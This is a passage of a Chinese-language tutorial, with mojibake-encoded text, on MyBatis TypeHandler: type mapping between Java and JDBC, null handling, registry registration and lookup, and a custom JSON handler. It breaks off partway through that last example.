<table><thead><tr><th>Javaç±»å‹</th><th>JDBCç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>String</td><td>VARCHAR, CHAR</td><td>å­—ç¬¦ä¸²ç±»å‹</td></tr><tr><td>Integer</td><td>INTEGER</td><td>æ•´æ•°ç±»å‹</td></tr><tr><td>Long</td><td>BIGINT</td><td>é•¿æ•´æ•°ç±»å‹</td></tr><tr><td>Date</td><td>TIMESTAMP</td><td>æ—¥æœŸæ—¶é—´ç±»å‹</td></tr><tr><td>BigDecimal</td><td>NUMERIC</td><td>ç²¾ç¡®æ•°å€¼ç±»å‹</td></tr></tbody></table>
<p>TypeHandlerçš„æ ¸å¿ƒä½œç”¨å°±æ˜¯è§£å†³è¿™äº›ç±»å‹ä¹‹é—´çš„æ˜ å°„å’Œè½¬æ¢é—®é¢˜ã€‚</p>
<h2 data-id="heading-4">äºŒã€TypeHandlerä½“ç³»æ¶æ„</h2>
<p>TypeHandleré‡‡ç”¨äº†æ³›å‹æ¥å£è®¾è®¡ï¼Œæ”¯æŒå„ç§ç±»å‹çš„æ‰©å±•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ad51ae683ef4acaa902418b69e1a75b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=SzXgf14IkE6foO9Sa0ZNOmOtSb8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">TypeHandleræ¥å£</h2>
<p>TypeHandleræ˜¯ç±»å‹è½¬æ¢çš„æ ¸å¿ƒæ¥å£ï¼Œå®šä¹‰äº†ç±»å‹è½¬æ¢çš„åŸºæœ¬æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; {
    <span class="hljs-comment">// è®¾ç½®PreparedStatementå‚æ•°ï¼ˆJava â†’ JDBCï¼‰</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, 
                     T parameter, JdbcType jdbcType)</span> 
                     <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–ResultSetç»“æœï¼ˆJDBC â†’ Javaï¼ŒæŒ‰åˆ—åï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> 
               <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–ResultSetç»“æœï¼ˆJDBC â†’ Javaï¼ŒæŒ‰åˆ—ç´¢å¼•ï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
               <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-comment">// è·å–CallableStatementç»“æœï¼ˆå­˜å‚¨è¿‡ç¨‹ï¼‰</span>
    T <span class="hljs-title function_">getResult</span><span class="hljs-params">(CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
               <span class="hljs-keyword">throws</span> SQLException;
}
</code></pre>
<h2 data-id="heading-6">BaseTypeHandleræŠ½è±¡ç±»</h2>
<p>ä¸ºäº†ç®€åŒ–TypeHandlerçš„å®ç°ï¼ŒMyBatisæä¾›äº†BaseTypeHandleræŠ½è±¡ç±»ï¼Œå®ƒå¸®æˆ‘ä»¬å¤„ç†äº†Nullå€¼æ£€æŸ¥ç­‰é€šç”¨é€»è¾‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;T&gt; 
    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, 
                            T parameter, JdbcType jdbcType)</span> 
                            <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (parameter == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¤„ç†Nullå€¼</span>
            ps.setNull(i, jdbcType.TYPE_CODE);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è®¾ç½®éç©ºå‚æ•°ï¼Œç”±å­ç±»å®ç°</span>
            setNonNullParameter(ps, i, parameter, jdbcType);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> 
                      <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> getNullableResult(rs, columnName);
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºnull</span>
        <span class="hljs-keyword">return</span> rs.wasNull() ? <span class="hljs-literal">null</span> : result;
    }

    <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼Œç”±å­ç±»å®ç°</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        T parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException;

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException;
}
</code></pre>
<h2 data-id="heading-7">TypeHandlerç»§æ‰¿ä½“ç³»</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26bad2f4c5c04afb89f4562dafd21504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=seTQVfs5hUvlRob5Vz3jihj5V5Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€ç±»å‹è½¬æ¢åŒå‘æµç¨‹</h2>
<p>TypeHandlerå®ç°äº†Javaç±»å‹ä¸JDBCç±»å‹ä¹‹é—´çš„åŒå‘è½¬æ¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f9997be96a74b76859dc8ce2cc2a2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=R66jf4fAEP4quOgUYQxhR1ryAzk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">Java â†’ JDBC è½¬æ¢æµç¨‹</h2>
<p>å½“æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œéœ€è¦å°†Javaå‚æ•°è½¬æ¢ä¸ºJDBCå‚æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// 1. ParameterHandlerè·å–å‚æ•°å€¼
Object <span class="hljs-attr">value</span> = getParameterValue(
    parameterObject, parameterMapping)<span class="hljs-comment">;</span>

// 2. è·å–å¯¹åº”çš„TypeHandler
TypeHandler&lt;?&gt; <span class="hljs-attr">typeHandler</span> = 
    parameterMapping.getTypeHandler()<span class="hljs-comment">;</span>

// 3. è°ƒç”¨setParameterè®¾ç½®å‚æ•°
typeHandler.setParameter(ps, i + 1, value, jdbcType)<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-10">JDBC â†’ Java è½¬æ¢æµç¨‹</h2>
<p>å½“ä»ResultSetè·å–ç»“æœæ—¶ï¼Œéœ€è¦å°†JDBCæ•°æ®è½¬æ¢ä¸ºJavaå¯¹è±¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 1. ResultSetHandlerå¤„ç†ResultSet</span>
while (resultSet.next()) {
    <span class="hljs-comment">// 2. æ ¹æ®ResultMappingè·å–TypeHandler</span>
    TypeHandler&lt;?&gt; typeHandler = 
        resultMapping<span class="hljs-selector-class">.getTypeHandler</span>();

    <span class="hljs-comment">// 3. è°ƒç”¨getResultè·å–ç»“æœ</span>
    <span class="hljs-selector-tag">Object</span> value = typeHandler<span class="hljs-selector-class">.getResult</span>(
        resultSet, column);

    <span class="hljs-comment">// 4. è®¾ç½®åˆ°ç›®æ ‡å¯¹è±¡</span>
    metaObject<span class="hljs-selector-class">.setValue</span>(property, value);
}
</code></pre>
<h2 data-id="heading-11">å››ã€å‚æ•°è®¾ç½®æ—¶çš„ç±»å‹è½¬æ¢</h2>
<p>å‚æ•°è®¾ç½®æ˜¯Javaç±»å‹å‘JDBCç±»å‹è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a139f1c5f914effbc2d910d4b21482f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=JQ5i9FSDz4Y6XO951gOfIG5S5vg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">åŸºæœ¬ç±»å‹è½¬æ¢ç¤ºä¾‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;String&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        String parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// String â†’ VARCHAR</span>
        ps.setString(i, parameter);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// VARCHAR â†’ String</span>
        <span class="hljs-keyword">return</span> rs.getString(columnName);
    }
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;Long&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        Long parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Long â†’ BIGINT</span>
        ps.setLong(i, parameter);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// BIGINT â†’ Long</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getLong(columnName);
        <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šæ£€æŸ¥æ˜¯å¦ä¸ºNULL</span>
        <span class="hljs-keyword">return</span> value == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull() ? <span class="hljs-literal">null</span> : value;
    }
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;Date&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        Date parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Date â†’ Timestamp</span>
        ps.setTimestamp(i, 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timestamp</span>(parameter.getTime()));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// Timestamp â†’ Date</span>
        <span class="hljs-type">Timestamp</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> rs.getTimestamp(columnName);
        <span class="hljs-keyword">return</span> timestamp == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : 
               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timestamp.getTime());
    }
}
</code></pre>
<h2 data-id="heading-13">Nullå€¼å¤„ç†</h2>
<p>Nullå€¼å¤„ç†æ˜¯å‚æ•°è®¾ç½®ä¸­çš„é‡è¦ç¯èŠ‚ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœºæ™¯1ï¼šæ˜ç¡®çš„jdbcType --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"insertUser"</span>&gt;</span>
    INSERT INTO t_user (name, email)
    VALUES (
        #{name, jdbcType=VARCHAR}, 
        #{email, jdbcType=VARCHAR}
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>

<span class="hljs-comment">&lt;!-- åœºæ™¯2ï¼šå…¨å±€é…ç½®Nullçš„jdbcType --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jdbcTypeForNull"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"NULL"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
</code></pre>
<p>é‡è¦æç¤ºï¼šæœªæŒ‡å®šjdbcTypeæ—¶ï¼Œä¼ å…¥nullå‚æ•°ä¼šæŠ›å‡ºå¼‚å¸¸ï¼</p>
<h2 data-id="heading-14">äº”ã€ç»“æœé›†è·å–æ—¶çš„ç±»å‹è½¬æ¢</h2>
<p>ç»“æœé›†è·å–æ˜¯JDBCç±»å‹å‘Javaç±»å‹è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8f85705b7994c8da2d333c98536eced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=a4y9WD%2B28op%2FvBRBXoVesQBIlhM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">ResultSetç»“æœè·å–æµç¨‹</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// éå†ResultSetçš„å®Œæ•´æµç¨‹</span>
while (resultSet.next()) {
    for (ResultMapping mapping : 
         resultMap.getPropertyResultMappings()) {

        <span class="hljs-comment">// è·å–åˆ—å</span>
        String column = mapping<span class="hljs-selector-class">.getColumn</span>();

        <span class="hljs-comment">// è·å–TypeHandler</span>
        TypeHandler&lt;?&gt; handler = 
            mapping<span class="hljs-selector-class">.getTypeHandler</span>();

        <span class="hljs-comment">// è·å–ç»“æœå€¼</span>
        <span class="hljs-selector-tag">Object</span> value = handler<span class="hljs-selector-class">.getResult</span>(
            resultSet, column);

        <span class="hljs-comment">// è®¾ç½®åˆ°ç›®æ ‡å¯¹è±¡</span>
        metaObject<span class="hljs-selector-class">.setValue</span>(
            mapping.getProperty(), value);
    }
}
</code></pre>
<h2 data-id="heading-16">ä¸‰ç§getResultæ–¹å¼</h2>
<p>TypeHandleræä¾›äº†ä¸‰ç§è·å–ç»“æœçš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">@<span class="hljs-function">Override
<span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, <span class="hljs-type">String</span> columnName)</span> 
    throws SQLException </span>{
    <span class="hljs-keyword">return</span> rs.<span class="hljs-built_in">getString</span>(columnName);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
<pre><code class="hljs language-java" lang="java">&lt;result column=<span class="hljs-string">"user_name"</span> property=<span class="hljs-string">"userName"</span>/&gt;
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> rs.getString(columnIndex);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼šè‡ªåŠ¨æ˜ å°„æˆ–éœ€è¦æŒ‰ç´¢å¼•è·å–æ—¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> cs.getString(columnIndex);
}
</code></pre>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>"callProcedure" statementType<span class="hljs-operator">=</span>"CALLABLE"<span class="hljs-operator">&gt;</span>
    {<span class="hljs-keyword">call</span> get_user_info(
        #{userId, mode<span class="hljs-operator">=</span><span class="hljs-keyword">IN</span>, jdbcType<span class="hljs-operator">=</span><span class="hljs-type">BIGINT</span>},
        #{userName, mode<span class="hljs-operator">=</span><span class="hljs-keyword">OUT</span>, jdbcType<span class="hljs-operator">=</span><span class="hljs-type">VARCHAR</span>}
    )}
<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span>
</code></pre>
<h2 data-id="heading-17">wasNull()çš„é‡è¦æ€§</h2>
<p>åœ¨ç±»å‹è½¬æ¢ä¸­ï¼ŒwasNull()æ–¹æ³•éå¸¸å…³é”®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
    ResultSet rs, String columnName)</span> 
    <span class="hljs-keyword">throws</span> SQLException {

    <span class="hljs-type">long</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getLong(columnName);
    <span class="hljs-comment">// âš ï¸ å¦‚æœæ•°æ®åº“æ˜¯NULLï¼ŒgetLong()è¿”å›0</span>

    <span class="hljs-comment">// âœ… å¿…é¡»æ£€æŸ¥wasNull()åŒºåˆ†çœŸå®çš„0å’ŒNULL</span>
    <span class="hljs-keyword">return</span> value == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull() ? <span class="hljs-literal">null</span> : value;
}
</code></pre>
<h2 data-id="heading-18">å…­ã€TypeHandleræ³¨å†Œæœºåˆ¶</h2>
<p>TypeHandlerRegistryè´Ÿè´£ç®¡ç†æ‰€æœ‰TypeHandlerçš„æ³¨å†Œå’ŒæŸ¥æ‰¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/089b9e45490544f1bfe3881634b176d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=ECN3JC3i9YWAkTLsa5To5ZUoe8Y%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">TypeHandlerRegistryç»“æ„</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeHandlerRegistry</span> {
    <span class="hljs-comment">// JDBCç±»å‹ â†’ TypeHandler</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt; 
        jdbcTypeHandlerMap = <span class="hljs-keyword">new</span> EnumMap&lt;&gt;(JdbcType.<span class="hljs-keyword">class</span>);

    <span class="hljs-comment">// Javaç±»å‹ â†’ (JDBCç±»å‹ â†’ TypeHandler)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;Type, Map&lt;JdbcType, TypeHandler&lt;?&gt;&gt;&gt; 
        typeHandlerMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();

    <span class="hljs-comment">// Javaç±»å‹ â†’ é»˜è®¤TypeHandler</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;Class&lt;?&gt;, TypeHandler&lt;?&gt;&gt; 
        allTypeHandlersMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TypeHandlerRegistry</span><span class="hljs-params">()</span></span>{
        <span class="hljs-comment">// æ³¨å†Œæ‰€æœ‰å†…ç½®TypeHandler</span>
        <span class="hljs-built_in">register</span>(Boolean.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">BooleanTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Integer.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">IntegerTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Long.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">LongTypeHandler</span>());
        <span class="hljs-built_in">register</span>(<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">StringTypeHandler</span>());
        <span class="hljs-built_in">register</span>(Date.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">DateTypeHandler</span>());
        <span class="hljs-comment">// ... æ›´å¤šæ³¨å†Œ</span>
    }
}
</code></pre>
<h2 data-id="heading-20">æ³¨å†ŒTypeHandlerçš„å››ç§æ–¹å¼</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    Class&lt;T&gt; javaType, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>((<span class="hljs-title class_">Type</span>) javaType, typeHandler);
}
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    Class&lt;T&gt; <span class="hljs-keyword">type</span>, 
    JdbcType jdbcType, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>((<span class="hljs-title class_">Type</span>) <span class="hljs-keyword">type</span>, jdbcType, typeHandler);
}
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">
    TypeReference&lt;T&gt; javaTypeReference, 
    TypeHandler&lt;? <span class="hljs-keyword">extends</span> T&gt; typeHandler</span>) {
    <span class="hljs-title function_">register</span>(javaTypeReference.<span class="hljs-title function_">getRawType</span>(), 
             typeHandler);
}
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> packageName</span>) {
    <span class="hljs-title class_">ResolverUtil</span>&lt;<span class="hljs-title class_">Class</span>&lt;?&gt;&gt; resolverUtil = 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResolverUtil</span>&lt;&gt;();
    resolverUtil.<span class="hljs-title function_">find</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResolverUtil</span>.<span class="hljs-title class_">IsA</span>(<span class="hljs-title class_">TypeHandler</span>.<span class="hljs-property">class</span>), 
        packageName);

    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&lt;?&gt;&gt;&gt; handlerSet = 
        resolverUtil.<span class="hljs-title function_">getClasses</span>();

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Class</span>&lt;?&gt; <span class="hljs-keyword">type</span> : handlerSet) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isAnonymousClass</span>() &amp;&amp; 
            !<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isInterface</span>() &amp;&amp; 
            !<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isAbstract</span>(<span class="hljs-keyword">type</span>.<span class="hljs-title function_">getModifiers</span>())) {
            <span class="hljs-title function_">register</span>(<span class="hljs-keyword">type</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-21">æŸ¥æ‰¾TypeHandler</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ¹æ®Javaç±»å‹å’ŒJDBCç±»å‹æŸ¥æ‰¾</span>
<span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; <span class="hljs-title function_">getTypeHandler</span>(<span class="hljs-params">
    Class&lt;T&gt; <span class="hljs-keyword">type</span>, JdbcType jdbcType</span>) {

    <span class="hljs-comment">// 1. ä»Javaç±»å‹æ˜ å°„ä¸­æŸ¥æ‰¾</span>
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">JdbcType</span>, <span class="hljs-title class_">TypeHandler</span>&lt;?&gt;&gt; jdbcHandlerMap = 
        typeHandlerMap.<span class="hljs-title function_">get</span>(<span class="hljs-keyword">type</span>);

    <span class="hljs-keyword">if</span> (jdbcHandlerMap != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">TypeHandler</span>&lt;?&gt; handler = 
            jdbcHandlerMap.<span class="hljs-title function_">get</span>(jdbcType);
        <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (<span class="hljs-title class_">TypeHandler</span>&lt;T&gt;) handler;
        }
    }

    <span class="hljs-comment">// 2. æŸ¥æ‰¾é»˜è®¤TypeHandler</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-title class_">TypeHandler</span>&lt;T&gt;) <span class="hljs-title function_">getTypeHandler</span>((<span class="hljs-title class_">Type</span>) <span class="hljs-keyword">type</span>);
}
</code></pre>
<h2 data-id="heading-22">ä¸ƒã€è‡ªå®šä¹‰TypeHandler</h2>
<p>å½“å†…ç½®TypeHandleræ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œå¯ä»¥è‡ªå®šä¹‰TypeHandlerã€‚</p>
<h2 data-id="heading-23">å®ç°TypeHandleræ¥å£</h2>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªJSONç±»å‹å¤„ç†å™¨çš„å®Œæ•´ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MappedTypes(List.class)</span>
<span class="hljs-meta">@MappedJdbcTypes(JdbcType.VARCHAR)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonListTypeHandler</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;List&lt;String&gt;&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Gson</span> <span class="hljs-variable">GSON</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Gson</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">LIST_TYPE</span> <span class="hljs-operator">=</span> 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeToken</span>&lt;List&lt;String&gt;&gt;(){}.getType();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(
        PreparedStatement ps, <span class="hljs-type">int</span> i, 
        List&lt;String&gt; parameter, JdbcType jdbcType)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// List&lt;String&gt; â†’ JSONå­—ç¬¦ä¸²</span>
